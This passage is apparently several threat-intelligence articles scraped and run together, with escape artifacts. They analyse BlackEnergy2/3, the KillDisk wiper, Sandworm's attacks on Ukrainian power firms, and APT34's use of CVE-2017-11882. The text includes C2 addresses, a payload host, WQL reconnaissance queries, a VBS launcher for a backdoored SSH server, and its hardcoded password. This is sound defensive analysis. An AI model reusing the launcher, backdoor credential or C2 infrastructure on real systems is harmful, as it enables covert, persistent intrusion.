config file\\nAlso, on some machines, documents were encrypted, but no related\\xa0plugin could be\\xa0found.\\nVictim #2\\nThe second organization was hacked via the first victim’s stolen VPN credentials. After the second organization was notified about the infection they started an internal investigation. They confirmed that some data was destroyed on their machines, so the BE2 attackers have exhibited some level of destructive activity. And, they revealed that their Cisco routers with different IOS versions were hacked. They weren’t able to connect to the routers any more by telnet and found the following “farewell” tcl scripts in the router’s file system:\\nCiscoapi.tcl – contains various wrappers over cisco EXEC-commands as described in the comments.\\nThe comment includes a punchy message for “kasperRsky”:\\nBE2 ciscoapi.tcl fragment\\nKillint.tcl – uses Ciscoapi.tcl, implements destroying functions:\\nBE2 killint.tcl fragment\\nThe script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files. The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang deleted them, and\\xa0unfortunately couldn’t restore them after they were deleted. The BE2 actor performs careful, professional activity covering their tracks:\\nciscoapi.tcl\\nkillint.tcl\\ntelnetapi2.tcl\\ntelnetu.tcl\\nstub.tcl\\nstub1.tcl\\nThere is evidence that the logs produced by some scripts were also stored on the FTP server, in particular the information on CDP neighbors\\xa0which is provided by one of the procedures of ciscoapi.tcl.\\nVictim #3\\nThe third organization got compromised by the same type of attack as the first one (an EXE file spoofing a doc within a Zip archive). All the plugins discovered in BE2 files were known, and there was no revelation of hacked network devices on their side and no destroyed data. The noticeable thing is that many computers contained both BE2 and BE3 files and some config files contained the following URL:\\nhxxps://46.165.222(dot)28/upgrade/f3395cd54cf857ddf8f2056768ff49ae/getcfg.php\\nThe URL contains the md5 of the string ‘router’. One of the discovered config files contained a URL with an as yet unidentified md5:\\nhxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php\\nVictim set #4\\nA set of victims discovered\\xa0installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy. Starting in March 2014 and ending in July 2014, Siemens “ccprojectmgr.exe” downloaded and executed a handful of\\xa0different payloads hosted at\\xa094.185.85.122/favicon.ico. They are all detected as variants of\\xa0“Backdoor.Win32.Blakken”.\\nBuild IDs\\nEach config file within BE2 main.dll has a field called build_id which identifies the malware version for the operators. Currently this particular BE/SandWorm gang uses a certain pattern for the build ids containing three hex numbers and three letters, as follows:\\n0C0703hji\\nThe numbers indicate the date of file creation in the format: Year-Month-Day. Still, the purpose of the letters is unknown, but most likely it indicates the targets.\\xa0The hex numbers weren’t used all the time, sometimes we observed decimal numbers:\\n100914_mg\\n100929nrT\\nMost interesting for us was the earliest build id we could find. Currently it is “OB020Ad0V”, meaning that the BE2/SandWorm APT started operating as early as the beginning of 2010.\\nAppendix: IoC\\nSince BE dropper installs its driver under a randomly picked non-used Windows driver name, there is no a static name for a driver to use it as IOC. The driver is self-signed on 64-bit systems\\nHowever, new “APT” BE2 uses one of the following filenames that\\xa0are used as an encrypted storage for plugins and the network settings. They are consistent and\\xa0serve as stable\\xa0IoC:\\n%system32%driverswinntd_.dat\\n%system32%driverswinntd.dat\\n%system32%driverswincache.dat\\n%system32%driversmlang.dat\\n%system32%driversosver32nt.dat\\n%LOCALAPPDATA%adobewind002.dat\\n%LOCALAPPDATA%adobesettings.sol\\n%LOCALAPPDATA%adobewinver.dat\\n%LOCALAPPDATA%adobecache.dat\\nBE2

plugins, Siemens targeting, dev fails\\nBy Kurt Baumgartner, Maria Garnaeva\\non February 17, 2015. 11:37 pm\\nOur November\\xa0post introducing our BlackEnergy2 (BE2) research described new findings on the group’s activity. We presented both details on their plugins and significant findings about some of their targets and victims. In this post, let’s examine several additional plugins more closely, targeting details around BE2 Siemens exploitation, and some of their unusual coding failures.\\nWe previously introduced an unknown set of plugins and functionality for the linux platform, six in total. For the windows platform, we collected 17 plugins. The last post noted the difficulty in collecting on this group. We finish descriptions for our set in this post.\\nbs\\ncert\\ndstr\\nfs\\ngrc\\njn\\nkl\\nprx\\nps\\nrd\\nscan\\nsn\\nss\\ntv\\nupd\\nusb\\nvsnet\\nWe also collected plugins for the MIPS/ARM architectures, as noted in the previous BE2 post.\\nweap\\nps\\nnm\\nsnif\\nhook\\nuper\\nExtraordinary Functionality\\nLet’s first examine some of the newest and most surprising Windows plugins. It’s interesting that all of these plugins use a custom “FindByHash” function to evade detection schemes and to slow analysis…\\nThe “Destroy” plugin, dstr\\nName\\ndstr.dll\\nMD5\\n8a0a9166cd1bc665d965575d32dfa972\\nType\\nWin32 DLL\\nSize\\n26,474 bytes\\nCompiledOn\\n2014.06.17 08:42:43\\nThe most troubling plugin in the list is the “dstr” plugin. It is a Windows-only plugin. It was used to overwrite data by the BE2 actor, destroying data stored on hard drives by overwriting file contents. While its use may be intended to cover their tracks, it is heavy handed to use this type of tool to cover one’s tracks in a network. Most likely it is a tool of sabotage, much like the Destover wiper seen on Sony Pictures Entertainment’s networks. However, it’s interesting that the BE2 developers created wiper code different from the Destover and Shamoon wiper malware we saw in the Saudi Aramco and SPE attacks. Instead of re-using the commercial EldoS RawDisk drivers in their malware, the BE2 developers wrote their own low-level disk and file destruction routines. It’s also a much more chilling deployment of wipers – instead of a poorly defended media studio, it was delivered to ICS environments.\\nIn order to overwrite stored data on all Windows versions, the dstr plugin supports both user-mode and kernel-mode wiper functionality, which is somewhat surprising. The component maintains both an embedded win32 library and win64 driver modules for its kernel mode functionality. They are rc4 encrypted.\\nUser-mode functionality\\nThe plugin identifies device id’s for the system’s HDD and creates a handle to the system’s physical drive, with “GENERIC_READ or GENERIC_WRITE” access. Several calls to DeviceIoControl collects data on the physical location of the volume, and the size and properties of this disk. It uses DeviceIoControl with the IOCTL_DISK_GET_DRIVE_GEOMETRY control code in order to retrieve Bytes Per Sector value. dstr then wipes out all open handles to the disk by dismounting it with the FSCTL_DISMOUNT_VOLUME control code.\\nThis routine prepares the system for overwrite and ensures no conflicts for plugin file I/O. Then it makes multiple WriteFile calls to write a zeroed out buffer to disk.\\nThe dstr plugin maintains code for unlocking and deleting the BE2 driver from disk, furthering the group’s goal of keeping their traces hidden from researchers. And notice the FindByHash set of calls above, this sfc_os call disables Windows File Protection for a minute while an application can delete or modify the locked file. So this plugin and its call can proceed and delete the driver.\\nThe plugin looks over all the services in the %system32%\\\\drivers folder and checks the write permission. If access is provided, it unlocks the file, rewrites the embedded driver under the existing driver name and launches it.\\nDrivers and kernel mode functionality\\nDecrypted 32-bit driver\\nName\\ndriver.sys\\nMD5\\nc4426555b1f04ea7f2e71cf18b0e5b6c\\nType\\nWin32 driver\\nSize\\n5,120 bytes\\nCompiledOn\\n2014.06.10 13:12:22 GMT\\nDecrypted 64-bit driver\\nName\\ndriver.sys\\nMD5\\n2cde6f8423e5c01da27316a9d1fe8510\\nType\\nWin64 driver\\nSize\\n9,136 bytes\\nCompiledOn\\n2014.06.10 13:12:04 GMT\\nThe 32-bit and 64-bit drivers are identical and compiled from the same source code. These small Windows drivers are supposed to support FAT32 and NTFS file systems, and contain two large code implementation mistakes. In spite of these flaws, it is clear that the author’s goal was to parse a file system and then write random data across files.\\nExtraordinary Fails\\nThese coding fails are unique to this dstr plugin, suggesting a development team effort behind the plugin set code.\\nFail #1:\\xa0The authors reversed the routines for FAT32 and NTFS data wiping when checking the presence of the “FAT32” string in the first 1024-bytes of the system drive.\\nFail #2: In the FAT32 routine the Root Directory Sector Number is calculated and is dealt as the absolute offset inside the file rather than next multiplying this number by the bytes per sector\\nIn comparison, there is no such mistake in the NTFS routine and the calculation of the MFT offset is implemented properly:\\nGoal – File Content Corruption\\nApart from that, it is interesting that the authors implement NTFS wiping in an unusual way with strange logic compared to FAT32 ‘straightforward’ wiping. The plugin accomplishes checks for FILE records and at first skips them. Then under certain conditions it rewrites non-FILE record sectors with random buffer which probably corresponds to some file contents and proceeds looping. Then it ends up rewriting the first sectors of MFT and MFT mirror.\\ngrc, plus.google.com replacement communications plugin\\nName\\ngrc.dll\\nMD5\\nee735c244a22b4308ea5d36afee026ab\\nType\\nWin32 DLL\\nSize\\n15,873 bytes\\nCompiledOn\\n2013.09.25 07:19:31\\nThis plugin creates a backup communications channel to yet another legitimate service. Most likely this backup channel is used to cloak outbound communications on monitored networks.

This png file content is actually encrypted data containing the new BE configuration file just as it was obtained using ‘normal’ C&C communication. \\xa0It is encrypted with RC4, just like the embedded dstr drivers. But unlike to the ‘typical’ RC4 BE decryption scheme that uses RC4 once, here it uses RC4 three times: once with hardcoded key found in the grc binary, the second time using the key extracted from the previous decrypted result, and the third time using the ‘id’ machine’s identifier that is normally served as the encryption key during the C&C communication.\\nUniversal serial bus data collection plugin, usb\\nName\\nusb.dll\\nMD5\\n0d4de21a2140f0ca3670e406c4a3b6a9\\nType\\nWin32 DLL\\nSize\\n34,816 bytes\\nCompiledOn\\n2014.03.21 07:02:48\\nThe usb plugin collects all available information on connected USB drives, and writes out all of these details to a text file, packs it, provides to the main BlackEnergy code, which communicates to a c2.\\nIt uses multiple api calls to collect information on multiple types of connected usb storage devices. It enumerates all usb storage devices connected to the system and retrieves data from all, including SCSI mass storage devices. And, most interestingly, it may be the first implementation of BadUSB-related techniques in APT re-purposed COTS malware that we have seen in the wild.\\nThe code queries scsi devices directly and sends them two types of SCSI commands. The first command with the opcode 0x1A which corresponds to MODE SENSE may result just in the logging of the failed call (‘SendSCSICommand return false’ message).\\nThe second type of SCSI command remains mysterious. It uses undefined opcode 0xf0 and there is no direct evidence of its purpose as it is stated to be vendor specific. This mysterious opcode is referenced around the same time frame of the plugin development in BadUSB offensive research http://algorithmics.bu.edu/twiki/bin/view/EC521/SectionA1/Group5FinalReport. Here, it is noticed in the USB traffic generated by an SMI controller tool. To be specific, there are two calls with the opcode 0xf0 in the code, each passed its own parameters. One of the parameters, 0x2A, is mentioned in the paper to return the string containing the firmware version, NAND flash ID, and controller part number. But this returned information is not logged anywhere.\\nAlso the code loops to retrieve detailed physical data about every attached storage device:\\nnumber of cylinders\\nmedia type (floppy, fixed hard drive, removable media, etc)\\nnumber of tracks per cylinder\\nsectors per track\\nnumber of bytes per sector\\nphysical disk size in bytes\\nDevice Instance ID\\nMotherboard and firmware data collection plugin, bios\\nName\\nbs.dll\\nMD5\\n4747376b00a5dd2a787ba4e926f901f4\\nType\\nWin32 DLL\\nSize\\n210,432 bytes\\nCompiledOn\\n2014.07.29 00:40:53\\nThe bios plugin gathers low level host system information:\\nBIOS\\nmotherboard\\nprocessor\\nOS\\nIt uses several\\xa0techniques to gather this information:\\nWMI\\nCPUID\\nwin32 api\\nAs a Windows Management Instrumentation (WMI) client application, it initializes COM and connects to the \\\\\\\\root\\\\cimv2 namespace to use the IWbemServices pointer and make WMI requests. The code executes wql queries (“wql” is “sql for wmi”, a subset of sql) to gather victim host details, like the query “SELECT Description, Manufacturer, Name, ProcessorId FROM Win32_Processor”. Here are several queries from the BlackEnergy2 plugin code:\\nSELECT Description, Manufacturer, Name, ProcessorId FROM Win32_Processor\\nSELECT Product, Manufacturer, Version FROM Win32_BaseBoard\\nSELECT Name, OSArchitecture, Version, BuildNumber FROM Win32_OperatingSystem\\nSELECT SerialNumber, Description, Manufacturer, SMBIOSBIOSVersion FROM Win32_BIOS\\nThese wql calls provide the attacker with the data like the lines below:\\nDescription=Intel64 Family 6 Model 60 Stepping 3\\nManufacturer=GenuineIntel\\nName=Intel(R) Core(TM) i7-4710MQ CPU @ 2.50GHz\\nProcessorId=1FEAFBCF000116A9\\nProduct=7MPXM1\\nManufacturer=AsusTek\\nVersion=??\\nName=Microsoft Windows 8.1 Pro\\nOSArchitecture=64-bit\\nVersion=6.3.9600\\nBuildNumber=9600\\nSerialNumber=7DTLG45\\nDescription=A12\\nManufacturer=AsusTek\\nSMBIOSBIOSVersion=A12\\nThis selectivity is fairly usual. And the plugin does not modify its own behavior based the collected values. What can we infer about the selection of only these values, as they are only being collected and sent back to the attackers? Here are some possibilities:\\nthe attackers want to evade sandbox and honeypot/decoy environments, and use this collected data to id the host system.\\nthe attackers have prior knowledge of the environment they are attempting to penetrate, down to the equipment make. Or, they have an idea of the types of hardware they would expect or want to see. In ICS and SCADA environments, these details could be very valuable for an attacker setting up shop. These details could aid in establishing persistence, evaluating true resource capacity and capabilities, tracking down the source of the equipment, or aiding further lateral movement\\nthe attackers know nothing about the network they are penetrating. They are collecting this information to better understand where this plugin really is running in the victim environment and planning their next moves\\nWhen using standard win32 api, the application implements calls to retrieve information on system locales. Oddly, there is special handling for one nordic locale in this particular plugin, “Norwegian-Nynorsk”.\\nThe CPU data collection functionality first calls the Intel cpuid instruction directly. It also directly handles multi-cpu systems and each of their feature sets. This SMP support is hard coded into the plugin.\\nAdditional BE2 Siemens Exploitation Details\\nTargeting details for BE2 actor events are interesting. When focusing on research sites and energy engineering facilities, the group remotely exploited Siemens’ Simatic WinCC systems. In these events, the attackers attempted to force the ccprojectmgr.exe process to download and execute a specific BlackEnergy2 payload. Let’s examine\\xa0a couple of example targets here. Based on the different delays for return, the attacks were\\xa0possibly not automated.\\nTarget A:\\nThe first exploit attempt ksn recorded was March 2014. The attackers returned with a second failed attempt to exploit that same research system on April 2014, approximately 30 days, 2 hours later.\\nTarget B:\\nThe BE2 actor then attacked a new target system in May 2014 and failed, and returned with an exploit attempt on that same system in July 2014.\\nSo it looks like there may be a timing cycle to their visits, but the volumes here are too low to be significant.\\nIn all four of these attempts on two different targets, the attackers tried to download their payload from hxxp://94.185.85(dot)122/favicon.ico. The payload changed slightly from March 2014 to the very end of July 2014, presenting the following md5(s). All of these droppers are BE2 malware, modify an existing kernel driver service like “ACPIEC” and start it to load the BE2 kernel module. Note that the attackers planned on re-using the same c2 for the first target, but changed the callback c2 for the second target. None of these components are signed:\\nfda6f18cf72e479570e8205b0103a0d3 → drops df84ff928709401c8ad44f322ec91392, driver, debug string:”xxxxxxxx.pdb”.

In this blog, we provide details on the BlackEnergy samples ESET has detected in 2015, as well as the KillDisk components used in the attacks. Furthermore, we examine a previously unknown SSH backdoor that was also used as another channel of accessing the infected systems, in addition to BlackEnergy.\\nWe continue to monitor the BlackEnergy malware operations for future developments. For any inquiries or to make sample submissions related to the subject, contact us at: threatintel@eset.com\\nBlackEnergy evolution in 2015\\nOnce activated, variants of BlackEnergy Lite allow a malware operator to check specific criteria in order to assess whether the infected computer truly belongs to the intended target. If that is the case, the dropper of a regular BlackEnergy variant is pushed to the system. The exact mechanism of infection by BlackEnergy is described in our Virus Bulletin presentation and this whitepaper by F-Secure.\\nThe BlackEnergy malware stores XML configuration data embedded in the binary of DLL payload.\\nFigure 1 – The BlackEnergy configuration example used in 2015\\nApart from a list of C&C servers, the BlackEnergy config contains a value called build_id. This value is a unique text string used to identify individual infections or infection attempts by the BlackEnergy malware operators. The combinations of letters and numbers used can sometimes reveal information about the campaign and targets.\\nHere is the list of Build ID values that we identified in 2015:\\n2015en\\nkhm10\\nkhelm\\n2015telsmi\\n2015ts\\n2015stb\\nkiev_o\\nbrd2015\\n11131526kbp\\n02260517ee\\n03150618aaa\\n11131526trk\\nWe can speculate that some of them have a special meaning. For example 2015telsmi could contain the Russian acronym SMI – Sredstva Massovoj Informacii, 2015en could mean Energy, and there’s also the obvious “Kiev”.\\nKillDisk component\\nIn 2014 some variants of the BlackEnergy trojan contained a plugin designed for the destruction of the infected system, named dstr.\\nIn 2015 the BlackEnergy group started to use a new destructive BlackEnergy component detected by ESET products as Win32/KillDisk.NBB, Win32/KillDisk.NBC and Win32/KillDisk.NBD trojan variants.\\nThe main purpose of this component is to do damage to data stored on the computer: it overwrites documents with random data and makes the OS unbootable.\\nThe first known case where the KillDisk component of BlackEnergy was used was documented by CERT-UA in November 2015. In that instance, a number of news media companies were attacked at the time of the 2015 Ukrainian local elections. The report claims that a large number of video materials and various documents were destroyed as a result of the attack.\\nIt should be noted that the Win32/KillDisk.NBB variant used against media companies is more focused on destroying various types of files and documents. It has a long list of file extensions that it tries to overwrite and delete. The complete list contains more than 4000 file extensions.\\nFigure 2 – A partial list of file extensions targeted for destruction by KillDisk.NBB\\nThe KillDisk component used in attacks against energy companies in Ukraine was slightly different. Our analysis of the samples shows that the main changes made in the newest version are:\\nNow it accepts a command line argument, to set a specific time delay when the destructive payload should activate.\\nIt also deletes Windows Event Logs : Application, Security, Setup, System.\\nIt is less focused on deleting documents. Only 35 file extensions are targeted.\\nFigure 3 – A list of file extensions targeted for destruction by new variant of KillDisk component\\nAs well as being able to delete system files to make the system unbootable – functionality typical for such destructive trojans – the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems.\\nOnce activated, this variant of the KillDisk component looks for and terminates two non-standard processes with the following names:\\nkomut.exe\\nsec_service.exe\\nWe didn’t manage to find any information regarding the name of the first process (komut.exe).\\nThe second process name may belong to software called ASEM Ubiquity, a software platform that is often used in Industrial control systems (ICS), or to ELTIMA Serial to Ethernet Connector. In case the process is found, the malware does not just terminate it, but also overwrites the executable file with random data.\\nBackdoored SSH server\\nIn addition to the malware families already mentioned, we have discovered an interesting sample used by the BlackEnergy group. During our investigation of one of the compromised servers we found an application that, at first glance, appeared to be a legitimate SSH server called Dropbear SSH.\\nIn the order to run the SSH server, the attackers created a VBS file with the following content:\\nSet WshShell = CreateObject(“WScript.Shell”)\\nWshShell.CurrentDirectory = “C:\\\\WINDOWS\\\\TEMP\\\\Dropbear\\\\”\\nWshShell.Run “dropbear.exe -r rsa -d dss -a -p 6789”, 0, false\\nAs is evident here, the SSH server will accept connections on port number 6789. By running SSH on the server in a compromised network, attackers can come back to the network whenever they want.\\nHowever, for some reason this was not enough for them. After detailed analysis we discovered that the binary of the SSH server actually contains a backdoor.\\nFigure 4 – Backdoored authentication function in SSH server\\nAs you can see in Figure 4, this version of Dropbear SSH will authenticate the user if the password passDs5Bu9Te7 was entered. The same situation applies to authentication by key pair – the server contains a pre-defined constant public key and it allows authentication only if a particular private key is used.\\nFigure 5 – The embedded RSA public key in SSH server\\nESET security solutions detect this threat as Win32/SSHBearDoor.A trojan.\\nIndicators of Compromise (IoC)\\nIP addresses of BlackEnergy C2-servers:\\n5.149.254.114\\n5.9.32.230\\n31.210.111.154\\n88.198.25.92\\n146.0.74.7\\n188.40.8.72\\nXLS document with malicious macro SHA-1:\\nAA67CA4FB712374F5301D1D2BAB0AC66107A4DF1\\nBlackEnergy Lite dropper SHA-1:\\n4C424D5C8CFEDF8D2164B9F833F7C631F94C5A4C\\nBlackEnergy Big dropper SHA-1:\\n896FCACFF6310BBE5335677E99E4C3D370F73D96\\nBlackEnergy drivers SHA-1:\\n069163E1FB606C6178E23066E0AC7B7F0E18506B\\n0B4BE96ADA3B54453BD37130087618EA90168D72\\n1A716BF5532C13FA0DC407D00ACDC4A457FA87CD\\n1A86F7EF10849DA7D36CA27D0C9B1D686768E177\\n1CBE4E22B034EE8EA8567E3F8EB9426B30D4AFFE\\n20901CC767055F29CA3B676550164A66F85E2A42\\n2C1260FD5CEAEF3B5CB11D702EDC4CDD1610C2ED\\n2D805BCA41AA0EB1FC7EC3BD944EFD7DBA686AE1\\n4BC2BBD1809C8B66EECD7C28AC319B948577DE7B\\n502BD7662A553397BBDCFA27B585D740A20C49FC\\n672F5F332A6303080D807200A7F258C8155C54AF\\n84248BC0AC1F2F42A41CFFFA70B21B347DDC70E9\\nA427B264C1BD2712D1178912753BAC051A7A2F6C\\nA9ACA6F541555619159640D3EBC570CDCDCE0A0D\\nB05E577E002C510E7AB11B996A1CD8FE8FDADA0C\\nBD87CF5B66E36506F1D6774FD40C2C92A196E278\\nBE319672A87D0DD1F055AD1221B6FFD8C226A6E2\\nC7E919622D6D8EA2491ED392A0F8457E4483EAE9\\nCD07036416B3A344A34F4571CE6A1DF3CBB5783F\\nD91E6BB091551E773B3933BE5985F91711D6AC3B\\nE1C2B28E6A35AEADB508C60A9D09AB7B1041AFB8\\nE40F0D402FDCBA6DD7467C1366D040B02A44628C\\nE5A2204F085C07250DA07D71CB4E48769328D7DC\\nKillDisk-components SHA-1:\\n16F44FAC7E8BC94ECCD7AD9692E6665EF540EEC4\\n8AD6F88C5813C2B4CD7ABAB1D6C056D95D6AC569\\n6D6BA221DA5B1AE1E910BBEAA07BD44AFF26A7C0\\nF3E41EB94C4D72A98CD743BBB02D248F510AD925\\nVBS/Agent.AD trojan SHA-1:\\n72D0B326410E1D0705281FDE83CB7C33C67BC8CA\\nWin32/SSHBearDoor.A trojan SHA-1:\\n166D71C63D0EB609C4F77499112965DB7D9A51BB\\nPicture credits: ©flickr/tanozzo\\nAnton Cherepanov 3 Jan 2016 - 12:28AM\\nSimilar Articles\\nCybercrime\\nFBI: Cybercrime losses tripled over the last 5 years\\nCybercrime\\nHow to catch a cybercriminal: Tales from the digital forensics lab\\nCybercrime\\nFBI shuts down website selling billions of stolen records\\nCybercrime\\nSimple steps to protect yourself against identity theft\\nDiscussion\\nHome\\nAbout Us\\nContact Us\\nSitemap\\nOur Experts\\nESET\\nResearch\\nHow To\\nCategories\\nRSS Configurator\\nNews Widget\\nPrivacy policy\\nLegal Information\\nCopyright © ESET, All Rights Reserved\\nBack to top', 'Sandworm Team and the Ukrainian Power Authority Attacks | FireEye Inc\\nReport an Incident\\nContact Us\\nContact Us\\nChat with an Expert\\nReport an Incident\\nSearch\\nSearch FireEye.com\\nGo\\nSolutions\\nEnterprise SecurityHelix Security Platform\\nVerodin Security Instrumentation\\nNetwork Security and Forensics\\nEndpoint Security\\nEmail Security\\nDetection On Demand\\nFireEye ExpertiseExpertise On Demand\\nManaged Defense\\nThreat Intelligence\\nSecurity For:Cloud\\nFinancial Services\\nGovernment\\nHealthcare\\nIndustrial Control Systems\\nVIEW ALL SOLUTIONS\\nServices\\nAssessCompromise Assessment\\nCloud Assessments\\nRed Team Assessment\\nPurple Team Assessments\\nSecurity Program Assessment\\nResponse Readiness Assessment\\nTabletop Exercise\\nPenetration Testing\\nTransformCyber Defense Center Development\\nDeployment and Integration Services\\nCyber Defense Operations\\nDefendManaged Defense\\nRespondIncident Response Services\\nIncident Response Retainer\\nTrainProduct, Intelligence and Expertise Training\\nThreatSpace Cyber Simulation Exercise\\nVIEW ALL SERVICES\\nCustomers\\nCustomersCustomer Stories\\nCustomer Success\\nCustomer Portal\\nGet SupportContact Support\\nFind AnswersSupport Programs\\nSupport Notices\\nSupported Products\\nCommunities\\nDocumentation Portal\\nSupport\\nA global network of support experts available 24x7.

The SANS ICS team has been coordinating ongoing discussions and providing analysis across multiple international community members and companies. We assess with high confidence based on company statements, media reports, and first-hand analysis that the incident was due to a coordinated intentional attack.\"\\nRead the full SANS post here - and see below for iSIGHT\\niSIGHT Partners Analyst Comment\\nThe SANS ICS blog confirms conclusions previously reached by iSIGHT regarding the nature of the Ukrainian attacks (specifically the role of destructive malware and phone disruption) and attribution to Sandworm Team. iSIGHT Partners believes this incident is a milestone because it is the first major cyber attack to substantially affect the civilian population and because of the overwhelming importance of the grid to multiple reliant sectors. Furthermore, Sandworm Team\\'s previous interest in US and European critical systems underscores the threat they pose (see below for more on Sandworm Team.)\\nSandworm Team - Historical Targeting of Ukraine and Interest in SCADA Systems\\nSince last week, iSIGHT Partners has worked to provide details on the power outage in Ukraine to our global customers. We have analyzed the forensic evidence we have been able to obtain from the region, contextualizing it within our knowledge of cyber espionage actors. Many details of the event remain unknown, and given the nature of the incident, especially the use of destructive malware, we do not anticipate every detail will be exposed.\\nHowever, we have linked Sandworm Team to the incident, principally based on BlackEnergy 3, the malware that has become their calling card.\\niSiGHT Partners has tracked Sandworm Team for some time - and we publicly reported on some of their activities in October 2014, when we discovered their use of a zero-day exploit, CVE-2014-4114. In that campaign, we saw targeting of Ukrainian government officials, members of the EU and NATO. Shortly after releasing information on their espionage operations, our friends at TrendMicro found evidence that the operators were not only conducting classic strategic espionage but targeting SCADA systems as well. Evidence of this accumulated, and iSIGHT Partners released a follow-up blog were we assessed that activity was reconnaissance for attack - a preparation for cyber attack to be carried out in the long term. ICS-CERT released a separate advisory as well.\\nSandworm Team Activity - Late 2014 to Current Day\\nSandworm Team went to ground shortly after being exposed in October of 2014, and malware with Dune references (the genesis for the \\'Sandworm\\' moniker) which we had previously used to track them disappeared entirely. However, the unique malware variant, BlackEnergy 3, reemerged in Ukraine early in 2015, where we had first found Sandworm Team. Throughout 2015 we saw increased intrusion activity using BlackEnergy 3. We warned our clients of new features suggesting an increased focus on European targets - though verification of targets was not possible at the time. Additionally, we warned our customers about the targeting of both media and regional power authorities in the Ukraine, sectors later affected by cyber attacks. Some of this information was recently shared by the folks at ESET, who have also been following Sandworm Team very closely for quite some time.\\nOn the Ukrainian Power Authority Incidents\\nLast week iSIGHT\\'s sources provided us with the same KillDisk malware published by Rob Lee of SANS and Dragos Security. As ESET has, we place this malware within the greater context of activity tied to BlackEnergy 3, which we believe is Sandworm Team. We believe this KillDisk malware is related to the destructive malware leveraged during Ukrainian elections in October. At the time, CERT-UA connected that incident to BlackEnergy 3. Symantec has since verified those claims. Furthermore, iSIGHT\\'s own sources indicate that BlackEnergy 3 malware was deployed on at least one of the Ukrainian power systems affected by KillDisk.\\niSIGHT Partners is still collecting information on the mechanics of the power outage and what role the KillDisk malware played in the greater event. We cannot confirm that the KillDisk malware caused the outage. It may have been used following steps to manipulate power in order to impede restoration efforts or operator visibility. It is noteworthy that technical support numbers associated with the power authorities were allegedly flooded with calls, which may have been an effort to further overwhelm responders. On their official website, the Ukrainian security service, SBU, made this claim.\\nOutlook\\nA cyber attack of this nature is a milestone -although a predictable one. The aggressive nature of Sandworm Team\\'s previous activity in Europe and the United States exposed their interest in targeting critical systems and indicated preparation for cyber attack. Targeting of critical entities in Ukraine throughout 2015, during a time of war, further presaged a desire to disrupt infrastructure.\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today\\'s advanced threats from FireEye.\\nShare\\nRecent Posts\\n24 Feb 2020Ransomware Against the Machine: How Adversaries are Learning to Disrupt\\nIndustrial Production by Targeting IT and OT\\n20 Feb 2020M-Trends 2020: Insights From the Front Lines\\n19 Feb 2020The Missing LNK — Correlating User Search LNK files\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages'\n"

We assess this activity was carried out by a suspected Iranian cyber espionage threat group, whom we refer to as APT34, using a custom PowerShell backdoor to achieve its objectives.\\nWe believe APT34 is involved in a long-term cyber espionage operation largely focused on reconnaissance efforts to benefit Iranian nation-state interests and has been operational since at least 2014. This threat group has conducted broad targeting across a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. We assess that APT34 works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests.\\nAPT34 uses a mix of public and non-public tools, often conducting spear phishing operations using compromised accounts, sometimes coupled with social engineering tactics. In May 2016, we\\xa0published\\xa0a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware. We now attribute that campaign to APT34. In July 2017, we observed APT34 targeting a Middle East organization using a PowerShell-based backdoor that we call POWRUNER and a downloader with domain generation algorithm functionality that we call BONDUPDATER, based on strings within the malware. The backdoor was delivered via a malicious .rtf file that exploited CVE-2017-0199.\\nIn this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER.\\nThe full report on APT34 is available to our\\xa0MySIGHT customer community.\\xa0APT34 loosely aligns with public reporting related to the group \"OilRig\". As individual organizations may track adversaries using varied data sets, it is possible that our classifications of activity may not wholly align.\\nCVE-2017-11882: Microsoft Office Stack Memory Corruption Vulnerability\\nCVE-2017-11882 affects several versions of Microsoft Office and, when exploited, allows a remote user to run arbitrary code in the context of the current user as a result of improperly handling objects in memory. The vulnerability was patched by Microsoft on Nov. 14, 2017. A full proof of concept (POC) was publicly released a week later by the reporter of the vulnerability.\\nThe vulnerability exists in the old Equation Editor (EQNEDT32.EXE), a component of Microsoft Office that is used to insert and evaluate mathematical formulas. The Equation Editor is embedded in Office documents using object linking and embedding (OLE) technology. It is created as a separate process instead of child process of Office applications. If a crafted formula is passed to the Equation Editor, it does not check the data length properly while copying the data, which results in stack memory corruption. As the EQNEDT32.exe is compiled using an older compiler and does not support address space layout randomization (ASLR), a technique that guards against the exploitation of memory corruption vulnerabilities, the attacker can easily alter the flow of program execution.\\nAnalysis\\nAPT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment in a malicious spear phishing email sent to the victim organization. The malicious file exploits CVE-2017-11882, which corrupts the memory on the stack and then proceeds to push the malicious data to the stack. The malware then overwrites the function address with the address of an existing instruction from EQNEDT32.EXE. The overwritten instruction (displayed in Figure 